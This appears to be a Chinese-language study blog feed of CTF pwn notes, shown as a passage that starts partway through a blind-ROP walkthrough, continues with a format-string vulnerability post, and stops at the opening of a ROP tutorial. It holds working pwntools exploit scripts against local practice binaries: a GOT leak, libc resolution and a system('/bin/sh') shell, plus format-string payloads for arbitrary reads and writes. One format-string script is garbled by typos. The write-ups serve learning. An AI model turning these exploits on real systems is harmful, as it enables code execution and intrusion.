ret;</code>的效果。</p><p>这个就比较牛逼了，可以控制函数的前两个传参，可以说非常重要了。</p><h2 id="0x04-控制put函数"><a href="#0x04-控制put函数" class="headerlink" title="0x04 控制put函数"></a>0x04 控制put函数</h2><h3 id="一、实现put函数的自由调用"><a href="#一、实现put函数的自由调用" class="headerlink" title="一、实现put函数的自由调用"></a>一、实现put函数的自由调用</h3><p>​    要实现对于put函数的自由调用，首先要找到其plt表的地址，加上我们的传参能力，就可以实现调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">stop_gadget = <span class="number">0x4005c0</span><span class="comment"># main地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi_ret就是根据6pop_gedget进行偏移，搞到的pop rdi;ret;的地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span></span><br><span class="line">    addr = <span class="number">0x400500</span><span class="comment">#这里实际上没必要从0x400000开始遍历，因为elf头的信息是无意义的</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        <span class="comment">#先执行pop edi传参，传的参数是0x400000，</span></span><br><span class="line">        <span class="comment">#这个地址是elf的开始位置，储存的是固定的elf头。</span></span><br><span class="line">        <span class="comment">#传参结束后进入addr作为遍历值，直到这个值是调用put的plt的时候，其内容才能被正确的输出。</span></span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">&#x27;\x7fELF&#x27;</span>):<span class="comment">#固定的elf头</span></span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">brop_gadget=<span class="number">0x4007ba</span></span><br><span class="line">rdi_ret=brop_gadget+<span class="number">9</span></span><br><span class="line">get_puts_addr(<span class="number">72</span>,rdi_ret,stop_gadget)</span><br></pre></td></tr></table></figure><p>​    put函数（实际是put函数的plt表项）的位置找到了之后，我们就能顺利的实现put函数的调用了，这时候我们实际就实现了<strong>任意读</strong>！</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220517103632338.png" alt="image-20220517103632338"></p><h3 id="二、dump程序源码"><a href="#二、dump程序源码" class="headerlink" title="二、dump程序源码"></a>二、dump程序源码</h3><p>​    下面只需要调用put，获取到put函数的got表地址，进而读取put函数的got表值。</p><p>​    原解析是吧整个程序从0x400000开始全部dump了出来，这样完全没有任何必要，我们从put.plt前的以0为结尾的第一个地址dump就可以了，即从0x400550开始dump，为了dump全，我们可以dump到0x400570。</p><p>注：解释一下为什么不直接从0x400555开始，这是因为64位程序段的解析必须从16的倍数，也就是最后一位为0的地址开始。</p><p>dump程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">&quot;\nWelCome&quot;</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005c0</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400555</span></span><br><span class="line">addr = <span class="number">0x400550</span> <span class="comment">#dump起始地址</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x400570</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">    data = dump(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data</span><br><span class="line">    addr += <span class="built_in">len</span>(data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><p>​    搞一个文件出来，丢进ida，把起始段地址设为0x400550：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220517104157940.png" alt="image-20220517104157940"></p><p>​    狂按u把所有被解析为代码的内容转化为数据，然后在0x400555处按c，转化为数据如上图所示，得到put函数的got表位置是0x601018（注意这里我们得到的是got表中put项的<strong>地址</strong>，不是put项的<strong>值</strong>）。</p><p>​    也就是说，我们要泄露put函数的真实地址，需要输出储存在0x601018这个地址上的值。</p><h2 id="0x05-最终getshell"><a href="#0x05-最终getshell" class="headerlink" title="0x05 最终getshell"></a>0x05 最终getshell</h2><p>​    我们通过上一步泄露的put函数的got表地址，通过got输出其中的值，就能够泄露put动态链接库地址，进而使用libcsearcher泄露libc基地址，最终达成调用，至此，这题就成为了一个最基础的roplibc了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">#stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">#brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">#puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment">#leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line"><span class="comment">#先泄露put.got中的值</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">&#x27;\nWelCome&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment">#计算system的值直接getshell</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn_格式化字符串漏洞</title>
      <link href="/2022/05/14/pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/05/14/pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-格式化字符串漏洞初步"><a href="#pwn-格式化字符串漏洞初步" class="headerlink" title="pwn_格式化字符串漏洞初步"></a>pwn_格式化字符串漏洞初步</h1><p>格式化字符串漏洞指的是在类似于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> test[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, test);</span><br><span class="line"><span class="built_in">printf</span>(test);</span><br></pre></td></tr></table></figure><p>​    这样的漏洞其核心就在于，printf函数的错误使用使得攻击者可以输入带有格式化字符串的内容，导致内存的泄露，可能造成任意读，任意写的结果，影响巨大。</p><h2 id="0x01-格式化字符串语法基础"><a href="#0x01-格式化字符串语法基础" class="headerlink" title="0x01 格式化字符串语法基础"></a>0x01 格式化字符串语法基础</h2><h3 id="一、常见语法"><a href="#一、常见语法" class="headerlink" title="一、常见语法"></a>一、常见语法</h3><p>c语言中常见的格式化输出：</p><ul><li>%d - 十进制 - 输出十进制整数 </li><li>%s - 字符串 - 从内存中读取字符串 </li><li>%x - 十六进制 - 输出十六进制数 </li><li>%c - 字符 - 输出字符 </li><li>%p - 指针 - 指针地址 </li><li>%n – 把前面打印过的字符长度输出到指定地址 </li><li>%N$ - 第 N 个参数</li></ul><h3 id="二、危险函数"><a href="#二、危险函数" class="headerlink" title="二、危险函数"></a>二、危险函数</h3><p>容易出现漏洞的函数：</p><table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到 stdout</td></tr><tr><td>fprintf</td><td>输出到指定 FILE 流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到 stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置 argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr><tr><td>err, verr, warn, vwarn 等</td><td>。。。</td></tr></tbody></table><h2 id="0x02-格式化字符串漏洞的利用"><a href="#0x02-格式化字符串漏洞的利用" class="headerlink" title="0x02 格式化字符串漏洞的利用"></a>0x02 格式化字符串漏洞的利用</h2><h3 id="一、程序崩溃"><a href="#一、程序崩溃" class="headerlink" title="一、程序崩溃"></a>一、程序崩溃</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s</span><br></pre></td></tr></table></figure><p>​    这个就是在栈上一个一个往后读，视为一个一个地址去找字符串，如果遇到一个不合法地址，程序就会崩溃。</p><h3 id="二、读栈内容"><a href="#二、读栈内容" class="headerlink" title="二、读栈内容"></a>二、读栈内容</h3><p>在正常的进行printf调用时，比如语句是这样的：</p><p><code>printf(&quot;hello %d %d %s&quot;,num1,2,str)</code>，其栈区内容会包括：</p><ul><li>printf函数返回地址；——<strong>低地址</strong></li><li>“hello %d %d %s”这个字符串的地址；</li><li>num1的值；</li><li>数字2；</li><li>str的地址；——<strong>高地址</strong></li></ul><p>但在不正常的调用时，printf函数会把栈上原有的内容当作参数。</p><p>​    也就是，我们可以一点一点把栈上的内容打印出来（先别管有啥用，问就是泄露），但是这样我们不太满意，比如说，我们只想要”hello %d %d %s”这个字符串的地址往后五个那个位置的内容，怎么办？</p><p>​    我们可以使用<code>%n$x</code>语法，其中n是一个数字，我们要输出第五个，填5就行，x表示输出的格式是十六进制数，总之，这样的语法的意思就是把第五个参数按照十六进制数输出。</p><p>因此，最直接的漏洞就是我们可以输出栈上的内容，比如：</p><ol><li>利用 <strong>%x</strong> 来获取对应栈的内存，但建议使用 <strong>%p</strong>，可以不用考虑位数的区别。</li><li>利用 <strong>%s</strong> 来获取变量所对应地址的内容，只不过有<strong>零截断</strong>，若对应地址没有内容则程序会崩溃。</li><li>利用 <strong>%order$x</strong> 来获取指定参数的<strong>值</strong>，利用 <strong>%order$s</strong> 来获取指定参数<strong>对应地址</strong>的内容。</li></ol><p>​    由于这样读参数的方法（计算参数order的方法），是从低地址向高地址计算，与栈的增长方向相反（我们遍历参数的方向是向高地址遍历，而栈的增长是向低地址增长，所以在这之前记录在栈上的内容是全都能读的），也就是，我们拥有了读栈上一切内容的能力，但是仅仅这样是不够的。</p><h3 id="三、任意读"><a href="#三、任意读" class="headerlink" title="三、任意读"></a>三、任意读</h3><p>​    我们要做到知道一个地址就能读，而不是只能在栈上的那一点偏移上读，怎么办。</p><p>​    我们换一个思路，如果要读一个地址，我们肯定要输入一个地址，那我们能控制的输入就只有那个格式化字符串，那个地址肯定是存在格式化字符串里的。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220514174319366.png" alt="image-20220514174319366"></p><p>​    要实现任意写，我们使用的payload是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><p>​    具体利用思路如上图所示，左边为正常调用时的栈情况，右边是我们在做任意读的时候的利用方式，我们只需要用某种手段，确定图中的<strong>k值</strong>，也就是prinf函数的第一个参数，与其字符串储存位置的偏移，就可以基于这个偏移，把<strong>addr</strong>当作我们的<strong>第k个参数</strong>，然后将其作为一个字符串格式化字符串，打印出addr处的内容，实现任意读。</p><p>​    我们要确定这个k值，只需要使用和格式化输入<code>[tag]-%p-%p-%p-%p-%p-%p..</code>来判断偏移，从地址开始依次向上输出栈中的内容，直到输出了我们的tag内容，就能确定经过的k偏移了。</p><p>​    这里举一个printf泄露libc的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line"></span><br><span class="line">context(arch =<span class="string">&#x27;1386&#x27;</span>,OS=<span class="string">&#x27;linux&#x27;</span>,log_ level= <span class="string">&#x27;debug&#x27;</span> )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params"> payload</span>) :</span></span><br><span class="line">p = process( <span class="string">&#x27;./ fmtstr10&#x27;</span> )</span><br><span class="line">p.sendline (payload)</span><br><span class="line"><span class="keyword">return</span> p.recvall()</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(fmt_str)</span><br><span class="line">offset = autofmt. offset<span class="comment">#自动算偏移</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;offset = &#x27;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line"><span class="comment">#第一次运行先算偏移</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ fmtstr10&quot;</span> , stderr= PIPE)</span><br><span class="line">elf = p.elf</span><br><span class="line">scanf_ got = elf. got[<span class="string">&quot;__ isoc99_ scanf&quot;</span> ]</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>( scanf_ got))</span><br><span class="line">payLoad = p32(scanf_ got) +“%”+ <span class="built_in">str</span> (offset) +<span class="string">&quot;$S&quot;</span></span><br><span class="line"><span class="built_in">print</span> (payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>]))</span><br><span class="line">p. close()</span><br></pre></td></tr></table></figure><h3 id="四、在栈上写（假任意写）"><a href="#四、在栈上写（假任意写）" class="headerlink" title="四、在栈上写（假任意写）"></a>四、在栈上写（假任意写）</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220514182230563.png" alt="image-20220514182230563"></p><p>​    要对栈上的内容进行覆盖，我们使用的payload是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[addr of c]%012d%6$n</span><br></pre></td></tr></table></figure><p>​    我们的目的是要把变量c的值写为16（例子）。如右图，第要被写入的变量c的地址被视为第 k个参数，然后我们使用n指令进行写入，但是如果放任不管，那我们写入的就是4，也就是c的值会被写为4。（之所以是4，是因为c地址转化为字符串长度是4）<br>​    然而我们添加%012d，就是在这之前先输出一个长为12的整数，%012d表示输出长为12的整数，不足补0。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forc</span>():</span></span><br><span class="line">    sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">    c_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(c_addr)</span><br><span class="line">    payload = p32(c_addr) + <span class="string">&#x27;%012d&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">forc()</span><br></pre></td></tr></table></figure><p>​    仔细想一想，我们实现的并不是在栈上写，只要拥有地址和偏移量，我们好像就可以实现任意写，但是这里存在的问题是，我们写入的数据是极其有限的，比如我们上面的例子中，如果我们要写0、1、2、3就不行，因为初始的地址长度就是4，又或者我们想写入的也是一个地址（即一个很大很大的整数），这时候我们是否要先输出几十万位的填充位来凑n呢，很明显不太考究。</p><h3 id="五、真任意写"><a href="#五、真任意写" class="headerlink" title="五、真任意写"></a>五、真任意写</h3><p>​    简单的讨论一下，如何解决上面提到的数值过小和过大的情况：</p><h4 id="写小数字："><a href="#写小数字：" class="headerlink" title="写小数字："></a>写小数字：</h4><p>​    简单的说，思路就是把地址放在%n后面就可以了，偏移自己算；</p><h4 id="写大数字："><a href="#写大数字：" class="headerlink" title="写大数字："></a>写大数字：</h4><p>不想看了，直接贴脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804A028</span>,<span class="number">0x12345678</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forb</span>():</span></span><br><span class="line">    sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">    payload = fmt_str(<span class="number">6</span>, <span class="number">4</span>, <span class="number">0x0804A028</span>, <span class="number">0x12345678</span>)</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure><p>剩下的区域未来在探索吧…</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ROP学习笔记</title>
      <link href="/2022/05/10/ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/05/10/ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ROP学习笔记"><a href="#ROP学习笔记" class="headerlink" title="ROP学习笔记"></a>ROP学习笔记</h1><p>参考，搬运：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/</a><br>仅作个人学习使用！</p><h2 id="0x01-基本ROP"><a href="#0x01-基本ROP" class="headerlink" title="0x01 基本ROP"></a>0x01 基本ROP</h2><h3 id="0、寻找危险函数"><a href="#0、寻找危险函数" class="headerlink" title="0、寻找危险函数"></a>0、寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h3 id="1、ROP"><a href="#1、ROP" class="headerlink" title="1、ROP"></a>1、ROP</h3><p>ROP(Return Oriented Programming)</p><p>基本思想：<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><h3 id="2、每部分思路记录"><a href="#2、每部分思路记录" class="headerlink" title="2、每部分思路记录"></a>2、每部分思路记录</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text:"></a><strong>ret2text:</strong></h4><p>​    